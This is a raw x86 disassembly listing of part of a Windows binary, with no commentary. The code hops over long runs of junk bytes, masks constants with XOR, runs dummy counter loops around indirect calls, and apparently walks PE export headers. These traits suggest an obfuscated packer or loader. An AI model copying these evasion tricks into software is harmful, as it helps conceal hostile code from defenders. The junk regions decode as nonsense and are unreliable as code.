  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	lods   eax,DWORD PTR ds:[esi]
  4041d6:	jmp    0x4041d6
  4041d8:	push   0x52
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041a1
  4041e2:	in     al,dx
  4041e3:	dec    ebx
  4041e4:	jae    0x40417c
  4041e6:	mov    ah,0x3d
  4041e8:	mov    esp,DWORD PTR [edx]
  4041ea:	mov    DWORD PTR [ecx-0x4f],esi
  4041ed:	mov    ebx,0x364283c7
  4041f2:	and    ebx,DWORD PTR [edx+0x36]
  4041f5:	fld    st(2)
  4041f7:	das    
  4041f8:	pop    ebp
  4041f9:	retf   
  4041fa:	adc    ecx,DWORD PTR [ebx+0xc]
  4041fd:	scas   al,BYTE PTR es:[edi]
  4041fe:	mov    dh,0x85
  404200:	popf   
  404201:	fcom   QWORD PTR [edi+0x15]
  404204:	cs sbb eax,0x5bc87b03
  40420a:	inc    edi
  40420b:	fcomp  QWORD PTR ds:0xfb3040d
  404211:	stos   BYTE PTR es:[edi],al
  404212:	jns    0x4041aa
  404214:	cdq    
  404215:	jae    0x40423a
  404217:	and    DWORD PTR [edx+0x78],esp
  40421a:	sar    DWORD PTR [ecx],0xd
  40421d:	or     BYTE PTR [esp+ebp*2+0x1d],bl
  404221:	imul   edx,DWORD PTR [edi-0x719f5fe5],0xffffffd8
  404228:	loopne 0x40426f
  40422a:	cmc    
  40422b:	adc    BYTE PTR [edi+0x3401167f],bh
  404231:	jmp    0x7fd8:0xf77ffb8a
  404238:	icebp  
  404239:	push   ebx
  40423a:	cwde   
  40423b:	das    
  40423c:	push   edi
  40423d:	das    
  40423e:	cld    
  40423f:	inc    edi
  404240:	sub    BYTE PTR [esp+eax*1],dl
  404243:	xor    edi,ebp
  404245:	mov    ebp,0x1d110027
  40424a:	pop    esp
  40424b:	lods   al,BYTE PTR ds:[esi]
  40424c:	add    eax,0x456e8b12
  404251:	dec    esi
  404252:	or     eax,0x4187e26
  404257:	dec    ecx
  404258:	fwait
  404259:	aad    0x4c
  40425b:	idiv   esp
  40425d:	sbb    esp,esp
  40425f:	repnz aas 
  404261:	call   0x87d7fb6e
  404266:	pop    ds
  404267:	ror    BYTE PTR [ebx-0x80],cl
  40426a:	or     dh,BYTE PTR ds:0xbccb54ce
  404270:	sub    eax,0x37f56d9d
  404275:	inc    DWORD PTR [edx+0x60a4740c]
  40427b:	jg     0x404204
  40427d:	(bad)  
  40427f:	inc    edi
  404280:	xchg   al,ah
  404282:	in     eax,0x4a
  404284:	jae    0x404262
  404286:	xor    al,BYTE PTR [ebp+0x1f6b8253]
  40428c:	add    esi,DWORD PTR [edi]
  40428e:	inc    edx
  40428f:	or     ebp,ebp
  404291:	enter  0x57ce,0x2e
  404295:	push   esp
  404296:	or     eax,0x6c5cdeb4
  40429b:	outs   dx,BYTE PTR ds:[esi]
  40429c:	add    DWORD PTR [ebp+0x2e],edx
  40429f:	fsubrp st(5),st
  4042a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042a2:	(bad)  
  4042a3:	hlt    
  4042a4:	xor    BYTE PTR [edi+0x71],al
  4042a7:	fwait
  4042a8:	or     BYTE PTR [ebx],0x9b
  4042ab:	jmp    0x679abd1c
  4042b0:	jmp    DWORD PTR [esi-0x2c]
  4042b3:	aam    0x50
  4042b5:	lods   eax,DWORD PTR ds:[esi]
  4042b6:	sbb    cl,BYTE PTR [ebp+0x166f5ed1]
  4042bc:	rcl    ah,0xf4
  4042bf:	mov    ebp,0xd2dc8cd3
  4042c4:	dec    ebp
  4042c5:	jmp    0x87fa:0xa88660e6
  4042cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042cd:	push   esi
  4042ce:	jne    0x4042bc
  4042d0:	add    eax,0x53b60ed3
  4042d5:	xchg   BYTE PTR ds:0x365efa4e,dl
  4042db:	mov    bh,0x3b
  4042dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042de:	pusha  
  4042df:	sbb    DWORD PTR [ebp+0x7e5627e9],0xffffffce
  4042e6:	sbb    ebp,DWORD PTR [edi+0x63]
  4042e9:	sar    DWORD PTR [esi],0x78
  4042ec:	xchg   edx,eax
  4042ed:	pop    ds
  4042ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042ef:	push   ebx
  4042f0:	retf   
  4042f1:	std    
  4042f2:	ins    DWORD PTR es:[edi],dx
  4042f3:	(bad)  
  4042f5:	fcomp  st(2)
  4042f7:	cmp    bl,BYTE PTR [esi+0x5d]
  4042fa:	push   esp
  4042fb:	call   0x3820:0x76a58421
  404302:	sub    eax,0x5932706
  404307:	popf   
  404308:	mov    ch,0x1f
  40430a:	retf   
  40430b:	jns    0x404292
  40430d:	adc    bh,BYTE PTR [ebp-0x5ae10e7b]
  404313:	in     al,0x8b
  404315:	sub    BYTE PTR [edi],dl
  404317:	clc    
  404318:	call   0x9d0e3ca4
  40431d:	dec    eax
  40431e:	ja     0x404332
  404320:	sub    al,0x32
  404322:	pusha  
  404323:	(bad)  
  404324:	int3   
  404325:	adc    cl,BYTE PTR [esi-0x73]
  404328:	aam    0x24
  40432a:	rol    BYTE PTR [ebx],cl
  40432c:	lahf   
  40432d:	mov    DWORD PTR [ebx-0x248c1f0d],ecx
  404333:	push   edx
  404334:	add    eax,DWORD PTR [eax-0x47]
  404337:	adc    al,0x45
  404339:	and    eax,0xed51c818
  40433e:	fs aas 
  404340:	imul   esp,DWORD PTR [ebx-0x697038c9],0x31c6ad32
  40434a:	inc    ebx
  40434b:	cli    
  40434c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40434d:	pop    ebp
  40434e:	fsub   DWORD PTR [eax]
  404350:	pop    ds
  404351:	adc    BYTE PTR [esi+0x54],al
  404354:	(bad)  
  404355:	fistp  QWORD PTR [ecx+0x6]
  404358:	bound  ebp,QWORD PTR [edi-0x31]
  40435b:	test   al,0x3
  40435d:	jne    0x404318
  40435f:	(bad)  
  404360:	mov    ebx,0x3fdd9f5c
  404365:	xchg   ebx,eax
  404366:	xchg   esp,eax
  404367:	sub    BYTE PTR [esp+ebp*2+0x15],ch
  40436b:	es hlt 
  40436d:	mov    bh,0x29
  40436f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404370:	sub    esp,DWORD PTR [ebp+0x4e3c704b]
  404376:	ins    DWORD PTR es:[edi],dx
  404377:	xchg   ebx,eax
  404378:	test   BYTE PTR [eax+ebx*1+0x75ac9c18],ah
  40437f:	ins    DWORD PTR es:[edi],dx
  404380:	inc    edx
  404381:	and    dh,BYTE PTR [ecx-0x3]
  404384:	adc    BYTE PTR [edx-0x74],ah
  404387:	inc    esi
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42edef,0x42e7c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ede7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430435,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42edef,0x430435
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4304df,0x42e7c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e7cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ede3,0x42edeb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42edeb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43044d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	jae    0x404432
  40442e:	jecxz  0x4043cd
  404430:	std    
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x40444b
  404439:	jp     0x404410
  40443b:	pop    eax
  40443c:	(bad)  
  40443d:	fisub  WORD PTR [ecx-0x3e]
  404440:	fisub  WORD PTR [edx+0x1b]
  404443:	icebp  
  404444:	push   0x98b8c186
  404449:	std    
  40444a:	jmp    0xb62edba8
  40444f:	jecxz  0x40442f
  404451:	stos   BYTE PTR es:[edi],al
  404452:	mov    WORD PTR ss:[edx+0x61],fs
  404456:	jns    0x40442c
  404458:	aas    
  404459:	adc    dl,BYTE PTR [eax+eax*1-0xc]
  40445d:	mov    dl,0x5
  40445f:	sbb    eax,DWORD PTR [esi-0x2a]
  404462:	add    al,0x6
  404464:	retf   0x8da6
  404467:	jne    0x4043fa
  404469:	push   ecx
  40446a:	outs   dx,DWORD PTR ds:[esi]
  40446b:	sbb    al,0xee
  40446d:	add    BYTE PTR [ebx+0x4ca89e40],ch
  404473:	mov    ebx,0x64380376
  404478:	pop    ds
  404479:	retf   
  40447a:	mov    esi,0x41ce45b1
  40447f:	adc    ch,dh
  404481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404482:	add    esp,ecx
  404484:	lods   al,BYTE PTR ds:[esi]
  404485:	(bad)  
  404486:	out    dx,al
  404487:	cwde   
  404488:	jmp    0x9f57:0x852ec8fd
  40448f:	ja     0x404417
  404491:	sahf   
  404492:	sub    DWORD PTR [esi-0x57],ecx
  404495:	cmp    DWORD PTR [ecx+0x2f],ebp
  404498:	shr    DWORD PTR [edx-0x39e24a7a],0xc3
  40449f:	add    esp,ecx
  4044a1:	mov    eax,0x9fbad6b0
  4044a6:	sub    eax,0xbe5f8ba3
  4044ab:	adc    dh,0xc5
  4044ae:	and    DWORD PTR [ebp+0x4d],0xfffffff1
  4044b2:	jg     0x4044f7
  4044b4:	retf   0x945f
  4044b7:	fwait
  4044b8:	pop    ds
  4044b9:	sub    DWORD PTR [edx+0x5f],0x4bde6e15
  4044c0:	loop   0x4044f3
  4044c2:	jp     0x40447e
  4044c4:	mov    ebp,0x864906c1
  4044c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ca:	add    eax,0x9c621b70
  4044cf:	xor    eax,0x54d659f8
  4044d4:	repnz adc BYTE PTR [ecx+0x6],bh
  4044d8:	push   edx
  4044d9:	nop
  4044da:	sar    BYTE PTR [eax-0x30],0x74
  4044de:	dec    ecx
  4044df:	ja     0x404549
  4044e1:	mov    eax,ds:0xc34f8f94
  4044e6:	xchg   ebp,eax
  4044e7:	jae    0x4044c7
  4044e9:	push   ebp
  4044ea:	not    DWORD PTR [eax+0x3878c3ff]
  4044f0:	sahf   
  4044f1:	dec    BYTE PTR [ebp-0x56]
  4044f4:	iret   
  4044f5:	push   esi
  4044f6:	jae    0x40453a
  4044f8:	ja     0x4044c2
  4044fa:	je     0x404491
  4044fc:	mov    ds:0xe289a8b9,al
  404501:	push   edi
  404502:	and    DWORD PTR [ebp+0x207a21d9],ebx
  404508:	dec    ecx
  404509:	add    esi,0xfffffffe
  40450c:	add    al,0x92
  40450e:	or     eax,0x1d62ad60
  404513:	mov    eax,0xf4b84712
  404518:	xor    BYTE PTR [edi-0x7c49ab9a],ch
  40451e:	and    eax,0xb3ed9d71
  404523:	cmp    dl,BYTE PTR [ebp-0x732f8229]
  404529:	lahf   
  40452a:	mov    DWORD PTR [esi-0x28055bed],ebp
  404530:	jb     0x4045a4
  404532:	cmp    DWORD PTR [ebx-0x395bd502],edx
  404538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404539:	nop
  40453a:	and    al,0x77
  40453c:	das    
  40453d:	sbb    ebx,eax
  40453f:	inc    ecx
  404540:	mov    ebx,0xbb4523d3
  404545:	sbb    bh,BYTE PTR [esi-0x4eb3b708]
  40454b:	std    
  40454c:	sub    BYTE PTR [eax-0x39],ch
  40454f:	or     DWORD PTR [ebp+0x3b],ecx
  404552:	push   0x6a
  404554:	lahf   
  404555:	or     ebp,0xffffffb1
  404558:	mov    esp,0x70f1e28c
  40455d:	ds je  0x40456c
  404560:	pavgw  mm1,QWORD PTR [eax-0x69a127a]
  404567:	test   DWORD PTR [edi],esi
  404569:	jmp    0xed07:0xc4aa2b38
  404570:	mov    edx,0x18cac4ac
  404575:	mov    esp,DWORD PTR [edi-0x1c]
  404578:	sahf   
  404579:	retf   
  40457a:	das    
  40457b:	jnp    0x40451a
  40457d:	rcr    bh,1
  40457f:	scas   al,BYTE PTR es:[edi]
  404580:	push   esp
  404581:	add    BYTE PTR [ebx-0x2f],bl
  404584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404585:	outs   dx,DWORD PTR ds:[esi]
  404586:	int    0x8
  404588:	push   ds
  404589:	and    al,0x7a
  40458b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40458c:	mov    bh,0x6f
  40458e:	cmp    esi,edi
  404590:	popa   
  404591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404592:	and    DWORD PTR [esi+0x32fedfdf],edi
  404598:	ja     0x40458f
  40459a:	ror    DWORD PTR [esi+esi*8],0x5
  40459e:	popa   
  40459f:	xor    ecx,esp
  4045a1:	push   esp
  4045a2:	ds dec esi
  4045a4:	mov    ecx,DWORD PTR [edx]
  4045a6:	dec    ebp
  4045a7:	rol    DWORD PTR [ecx],0x1b
  4045aa:	jno    0x4045fa
  4045ac:	xor    al,0x9a
  4045ae:	in     al,dx
  4045af:	push   esp
  4045b0:	aam    0x45
  4045b2:	fild   QWORD PTR fs:[ebx+ebx*1]
  4045b6:	fwait
  4045b7:	ss test al,al
  4045ba:	push   esi
  4045bb:	ss xchg edx,eax
  4045bd:	sub    ebp,0x1b
  4045c0:	sbb    eax,0x21ea308b
  4045c5:	cmc    
  4045c6:	bound  esp,QWORD PTR [edi]
  4045c8:	lock sbb DWORD PTR ds:0x41d06b12,0x77
  4045d0:	leave  
  4045d1:	mov    ch,0x69
  4045d3:	push   es
  4045d4:	mov    cl,0xc3
  4045d6:	pushf  
  4045d7:	arpl   WORD PTR [ebx-0x35],bx
  4045da:	loop   0x40458a
  4045dc:	adc    BYTE PTR [ecx-0x57],cl
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4304e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430439,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430439
  40460c:	inc    eax
  40460d:	mov    ds:0x430439,eax
  404612:	cmp    DWORD PTR ds:0x430439,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430439,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ec13
  404650:	cmp    DWORD PTR ds:0x430439,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430439
  404662:	inc    eax
  404663:	mov    ds:0x430439,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42edd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430439,0x430471
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43045d,0x42eddb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404746
  4046fa:	push   ebx
  4046fb:	ss leave 
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x404760
  404706:	dec    ecx
  404707:	mov    dh,0x9f
  404709:	adc    eax,0x62e79237
  40470e:	cmp    ebx,ebp
  404710:	mov    dh,0xc4
  404712:	cli    
  404713:	pop    ebx
  404714:	push   0xffffffff
  404716:	push   es
  404717:	fiadd  DWORD PTR [edx+ecx*8+0x59af52a0]
  40471e:	and    eax,esp
  404720:	dec    ebx
  404721:	iret   
  404722:	inc    esi
  404723:	ja     0x40473e
  404725:	push   ss
  404726:	adc    eax,0x4e255e83
  40472b:	test   BYTE PTR [ebp+0xd],0x7b
  40472f:	leave  
  404730:	fadd   QWORD PTR [esi-0x32]
  404733:	xor    DWORD PTR [edi+0x5fd4f281],ebx
  404739:	gs (bad) 
  40473b:	xor    eax,0x8381a0c4
  404740:	jno    0x404714
  404742:	icebp  
  404743:	loopne 0x4046f6
  404745:	popf   
  404746:	clc    
  404747:	(bad)  
  404748:	mov    ebp,0x7bee2fd
  40474d:	mov    bh,0x6c
  40474f:	jns    0x4047d0
  404751:	scas   al,BYTE PTR es:[edi]
  404752:	adc    DWORD PTR [ecx-0x1b],edx
  404755:	pop    ebx
  404756:	data16 mov bh,0xe1
  404759:	dec    ebx
  40475a:	mov    ds:0xcab3e781,eax
  40475f:	pop    ss
  404760:	and    eax,0x1f99e821
  404765:	vpcmpgtq xmm6,xmm6,XMMWORD PTR [ebp+0x5eae7b7f]
  40476e:	jnp    0x40477f
  404770:	loop   0x4047af
  404772:	push   ebp
  404773:	int    0x22
  404775:	out    dx,eax
  404776:	or     BYTE PTR [ebp+edi*1+0x2c],al
  40477a:	pop    ds
  40477b:	es fs je 0x40472b
  40477f:	jl     0x40470c
  404781:	(bad)  
  404782:	(bad)  
  404783:	cmc    
  404784:	and    eax,0xdabdc530
  404789:	out    dx,al
  40478a:	push   esi
  40478b:	xlat   BYTE PTR ds:[ebx]
  40478c:	push   edi
  40478d:	std    
  40478e:	imul   esi,ebx,0xecc850f1
  404794:	dec    esp
  404795:	mov    edx,DWORD PTR [esi]
  404797:	ror    BYTE PTR [esp+ebp*4-0x3bce6b75],1
  40479e:	mov    edx,0xaf5b635c
  4047a3:	xchg   ecx,eax
  4047a4:	mov    eax,0xfa4db378
  4047a9:	xor    DWORD PTR [ebp+0x7a],esi
  4047ac:	push   esi
  4047ad:	mov    ds:0xa0a14d82,eax
  4047b2:	int    0x73
  4047b4:	mov    esp,0x60f375ec
  4047b9:	inc    eax
  4047ba:	(bad)  
  4047bb:	ins    BYTE PTR es:[edi],dx
  4047bc:	push   ss
  4047bd:	and    cl,BYTE PTR [esi-0x63]
  4047c0:	test   BYTE PTR [edi-0x17],ah
  4047c3:	mov    edi,edx
  4047c5:	fistp  WORD PTR [eax]
  4047c7:	mov    BYTE PTR [esi],bl
  4047c9:	shl    DWORD PTR [edi-0x22],1
  4047cc:	outs   dx,DWORD PTR ds:[esi]
  4047cd:	in     al,dx
  4047ce:	mov    edi,?
  4047d0:	gs add al,0x3c
  4047d3:	sub    BYTE PTR [ebp+0x78],ch
  4047d6:	and    eax,0xef591d
  4047db:	data16 adc BYTE PTR ds:0x2bcf18d6,cl
  4047e2:	xor    ebp,DWORD PTR [ebp+0x2b371d5a]
  4047e8:	rep lods al,BYTE PTR ds:[esi]
  4047ea:	stos   DWORD PTR es:[edi],eax
  4047eb:	dec    esi
  4047ec:	stos   DWORD PTR es:[edi],eax
  4047ed:	and    ebx,DWORD PTR [edi+0x5b]
  4047f0:	and    DWORD PTR [eax-0x3f],edx
  4047f3:	inc    esp
  4047f4:	add    al,0xe7
  4047f6:	add    eax,0x1cfd2c80
  4047fb:	fcom   DWORD PTR [edi]
  4047fd:	jmp    0x404877
  4047ff:	mov    al,ds:0xd8be3ae0
  404804:	and    ebp,edi
  404806:	push   ebx
  404807:	call   0x2d45:0xb65e584e
  40480e:	outs   dx,BYTE PTR ds:[esi]
  40480f:	lds    esi,FWORD PTR [edx-0x3c]
  404812:	xor    BYTE PTR [esi+eiz*8],dh
  404815:	ins    DWORD PTR es:[edi],dx
  404816:	fmul   QWORD PTR [eax+esi*2+0x35]
  40481a:	lahf   
  40481b:	or     al,0xce
  40481d:	push   edx
  40481e:	rcl    DWORD PTR [esp+ecx*8+0xeb5b314],0x8f
  404826:	and    eax,0xabf8f812
  40482b:	test   ecx,edx
  40482d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40482e:	mov    esi,0x408da672
  404833:	mov    esp,0x4f2e991d
  404838:	retf   0xc9d9
  40483b:	push   esp
  40483c:	sub    eax,0x136313d3
  404841:	not    DWORD PTR [ecx]
  404843:	fidiv  WORD PTR [edi-0x74]
  404846:	out    0xae,eax
  404848:	sbb    esp,DWORD PTR [ebp-0x2411e1f2]
  40484e:	in     al,dx
  40484f:	shr    esp,1
  404851:	jb     0x404832
  404853:	mov    al,0x93
  404855:	(bad)  [edx+0x62e7c901]
  40485b:	ins    DWORD PTR es:[edi],dx
  40485c:	cmp    ch,BYTE PTR [edi]
  40485e:	clc    
  40485f:	lods   eax,DWORD PTR ds:[esi]
  404860:	clc    
  404861:	jge    0x4047f1
  404863:	push   eax
  404864:	jne    0x404807
  404866:	call   0x9448:0xb0ac92d2
  40486d:	or     al,0x4
  40486f:	sbb    DWORD PTR [edx],ecx
  404871:	test   BYTE PTR [ebx+0x6db428f5],al
  404877:	inc    esp
  404878:	pop    ds
  404879:	shr    DWORD PTR [eax],1
  40487b:	mov    ebp,0x6c62fe38
  404880:	jmp    0x7400c25e
  404885:	in     eax,0x9a
  404887:	dec    ebp
  404888:	adc    eax,0x62cb1a4d
  40488d:	jo     0x4048cf
  40488f:	ret    
  404890:	xchg   edi,eax
  404891:	xchg   edi,eax
  404892:	add    BYTE PTR [esp+ebp*1+0x66],bl
  404896:	push   ebp
  404897:	retf   0xb474
  40489a:	outs   dx,DWORD PTR ds:[esi]
  40489b:	cli    
  40489c:	stos   BYTE PTR es:[edi],al
  40489d:	les    ebx,FWORD PTR [edi]
  40489f:	jo     0x4048b8
  4048a1:	sub    ebp,edx
  4048a3:	add    ch,ch
  4048a5:	aad    0x80
  4048a7:	call   0x26d7:0x629aaf4b
  4048ae:	cmc    
  4048af:	imul   esp,DWORD PTR [ebx-0x7f9230fa],0xffffff97
  4048b6:	add    edi,DWORD PTR [ebx+eax*8]
  4048b9:	ins    DWORD PTR es:[edi],dx
  4048ba:	dec    ecx
  4048bb:	or     BYTE PTR ds:0xf36597f7,ah
  4048c1:	sub    bl,BYTE PTR [ecx]
  4048c3:	loopne 0x404893
  4048c5:	mov    esi,0x5eb66c97
  4048ca:	sahf   
  4048cb:	dec    eax
  4048cc:	hlt    
  4048cd:	cmc    
  4048ce:	sahf   
  4048cf:	leave  
  4048d0:	jmp    0x93a7:0x9eccf0ce
  4048d7:	inc    edx
  4048d8:	push   cs
  4048d9:	icebp  
  4048da:	jno    0x404881
  4048dc:	sti    
  4048dd:	ins    BYTE PTR es:[edi],dx
  4048de:	loop   0x404913
  4048e0:	xor    BYTE PTR [edx+0x76],al
  4048e3:	stos   DWORD PTR es:[edi],eax
  4048e4:	jb     0x404908
  4048e6:	imul   edx,DWORD PTR [edx],0x1a
  4048e9:	push   ebp
  4048ea:	jmp    0xdce1a2cd
  4048ef:	mov    eax,0xb7a9092d
  4048f4:	pop    ecx
  4048f5:	mov    al,0xbd
  4048f7:	sub    bl,ch
  4048f9:	fisttp DWORD PTR [esi]
  4048fb:	mov    cl,0xdb
  4048fd:	sbb    al,0xf1
  4048ff:	cmp    BYTE PTR [ebx+0x1e],dl
  404902:	cmp    DWORD PTR [edx],0x4a
  404905:	cld    
  404906:	push   ecx
  404907:	mov    bl,BYTE PTR [edi-0x67]
  40490a:	jno    0x4048b0
  40490c:	pop    ebx
  40490d:	adc    eax,DWORD PTR [ecx-0x2d]
  404910:	xchg   esi,eax
  404911:	fs test al,0xad
  404914:	in     eax,dx
  404915:	pushf  
  404916:	lock lock mov eax,ds:0xb54faac2
  40491d:	mov    cl,0x7e
  40491f:	mov    dl,0x3e
  404921:	push   eax
  404922:	mov    ds:0xd4af4e5,al
  404927:	out    0xf3,eax
  404929:	mov    DWORD PTR [eax],eax
  40492b:	jb     0x4048d6
  40492d:	add    dh,0x3c
  404930:	pop    ebp
  404931:	pop    esp
  404932:	je     0x404975
  404934:	ficom  WORD PTR [ecx]
  404936:	lods   al,BYTE PTR ds:[esi]
  404937:	fsub   DWORD PTR [esi]
  404939:	bound  esp,QWORD PTR [edx-0x4e]
  40493c:	ret    
  40493d:	icebp  
  40493e:	and    cl,BYTE PTR [esi+eiz*4+0x4873d939]
  404945:	xor    ecx,ecx
  404947:	imul   esp,DWORD PTR [ebx+0x464c23b5],0xffffffcd
  40494e:	mov    eax,0x383ae07c
  404953:	jo     0x40491e
  404955:	or     al,0x6a
  404957:	push   edx
  404958:	clc    
  404959:	daa    
  40495a:	and    ecx,DWORD PTR [ebp+0x7b8bfbea]
  404960:	jns    0x404912
  404962:	cmp    eax,edi
  404964:	ret    0x5380
  404967:	gs scas eax,DWORD PTR es:[edi]
  404969:	loopne 0x404999
  40496b:	dec    edx
  40496c:	jno    0x404973
  40496e:	jne    0x404996
  404970:	xor    DWORD PTR [ecx+0xe],0xd5504f6
  404977:	clc    
  404978:	mov    ecx,edx
  40497a:	shr    BYTE PTR [edx+0x727bd61],1
  404980:	cs dec esi
  404982:	add    ch,BYTE PTR [esi-0x7b696df8]
  404988:	pop    esp
  404989:	imul   ecx,DWORD PTR [eax+0x4c436a82],0x70
  404990:	xor    DWORD PTR [edx+eiz*4-0x5b05f317],esi
  404997:	dec    ebx
  404998:	aas    
  404999:	push   ecx
  40499a:	cs inc esi
  40499c:	repz dec esi
  40499e:	(bad)
  4049a1:	or     dl,bl
  4049a3:	pop    ds
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e7d8,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e7d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e7d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e7d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e9cf
  4049da:	cmp    DWORD PTR ds:0x42e7d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e7d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e7d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e7d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42edeb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4304cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ede7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4304e3,0x4304df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ede7,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4304db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
